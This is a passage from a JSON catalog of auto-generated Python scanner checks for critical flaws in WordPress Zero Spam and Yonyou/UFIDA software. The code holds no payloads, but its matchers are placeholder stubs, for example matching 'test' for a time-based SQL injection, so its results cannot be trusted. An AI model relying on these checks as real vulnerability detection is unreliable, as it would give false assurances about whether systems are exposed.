        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: zero-spam-sql-injection\nName: WordPress Zero Spam <= 2.1.1 - Blind SQL Injection\nSeverity: critical\nDescription: The WordPress Zero Spam WordPress plugin was affected by an Unauthenticated Blind SQL Injection security vulnerability.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_zero_spam_sql_injection:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"zero-spam-sql-injection\"\n    SEVERITY = \"critical\"\n    NAME = \"WordPress Zero Spam <= 2.1.1 - Blind SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: duration>=7; status_code == 200'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"WordPress Zero Spam <= 2.1.1 - Blind SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_zero_spam_sql_injection(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: zero-spam-sql-injection\nName: WordPress Zero Spam <= 2.1.1 - Blind SQL Injection\nSeverity: critical\nDescription: The WordPress Zero Spam WordPress plugin was affected by an Unauthenticated Blind SQL Injection security vulnerability.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_zero_spam_sql_injection:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"zero-spam-sql-injection\"\n    SEVERITY = \"critical\"\n    NAME = \"WordPress Zero Spam <= 2.1.1 - Blind SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: duration>=7; status_code == 200'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"WordPress Zero Spam <= 2.1.1 - Blind SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_zero_spam_sql_injection(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "time-based-sqli",
          "wpscan",
          "wp",
          "wp-plugin",
          "wordpress",
          "zero-spam",
          "sqli",
          "unauth",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_grp_u8_uploadfiledata",
        "name": "UFIDA GRP-U8 UploadFileData - Arbitrary File Upload",
        "language": "Python",
        "famille": "WebApp",
        "description": "File upload vulnerability in UFIDA U8+ERP customer relationship management software. An attacker can use this vulnerability to gain control of the server.",
        "severity": "critical",
        "detection": "[OR] DSL: status_code_1 == 200 && contains(body_1,'showSucceedMsg'); status_code_2 == 200 && contains(body_2,'{{randstr_2}}')",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: grp-u8-uploadfiledata\nName: UFIDA GRP-U8 UploadFileData - Arbitrary File Upload\nSeverity: critical\nDescription: File upload vulnerability in UFIDA U8+ERP customer relationship management software. An attacker can use this vulnerability to gain control of the server.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_grp_u8_uploadfiledata:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"grp-u8-uploadfiledata\"\n    SEVERITY = \"critical\"\n    NAME = \"UFIDA GRP-U8 UploadFileData - Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] DSL: status_code_1 == 200 && contains(body_1,'showSucceedMsg'); status_code_2 == 200 && contains(body_2,'{{randstr_2}}')\"\n\n        # Simple word matcher simulation\n        matchers = ['showSucceedMsg', '{{randstr_2}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"UFIDA GRP-U8 UploadFileData - Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_grp_u8_uploadfiledata(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: grp-u8-uploadfiledata\nName: UFIDA GRP-U8 UploadFileData - Arbitrary File Upload\nSeverity: critical\nDescription: File upload vulnerability in UFIDA U8+ERP customer relationship management software. An attacker can use this vulnerability to gain control of the server.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_grp_u8_uploadfiledata:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"grp-u8-uploadfiledata\"\n    SEVERITY = \"critical\"\n    NAME = \"UFIDA GRP-U8 UploadFileData - Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] DSL: status_code_1 == 200 && contains(body_1,'showSucceedMsg'); status_code_2 == 200 && contains(body_2,'{{randstr_2}}')\"\n\n        # Simple word matcher simulation\n        matchers = ['showSucceedMsg', '{{randstr_2}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"UFIDA GRP-U8 UploadFileData - Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_grp_u8_uploadfiledata(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "yonyou",
          "fileupload",
          "grp",
          "intrusive",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_yonyou_filereceiveservlet_fileupload",
        "name": "Yonyou NC FileReceiveServlet - Aribitrary File Upload",
        "language": "Python",
        "famille": "WebApp",
        "description": "An unauthorized attacker can upload a file via the FileReceiveServlet endpoint.",
        "severity": "critical",
        "detection": "[OR] DSL: status_code_1 == 200 && status_code_2 == 200; contains(body_2, '{{file_content}}')",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "rand_str",
            "datatype": "string",
            "required": false,
            "description": "Chaîne aléatoire Nuclei"
          },
          {
            "name": "file_name",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: file_name",
            "default": "{{to_upper(rand_text_alphanumeric(5))}}.jsp"
          },
          {
            "name": "file_content",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: file_content",
            "default": "{{randstr}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: yonyou-filereceiveservlet-fileupload\nName: Yonyou NC FileReceiveServlet - Aribitrary File Upload\nSeverity: critical\nDescription: An unauthorized attacker can upload a file via the FileReceiveServlet endpoint.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_yonyou_filereceiveservlet_fileupload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"yonyou-filereceiveservlet-fileupload\"\n    SEVERITY = \"critical\"\n    NAME = \"Yonyou NC FileReceiveServlet - Aribitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] DSL: status_code_1 == 200 && status_code_2 == 200; contains(body_2, '{{file_content}}')\"\n\n        # Simple word matcher simulation\n        matchers = ['{{file_content}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Yonyou NC FileReceiveServlet - Aribitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_yonyou_filereceiveservlet_fileupload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
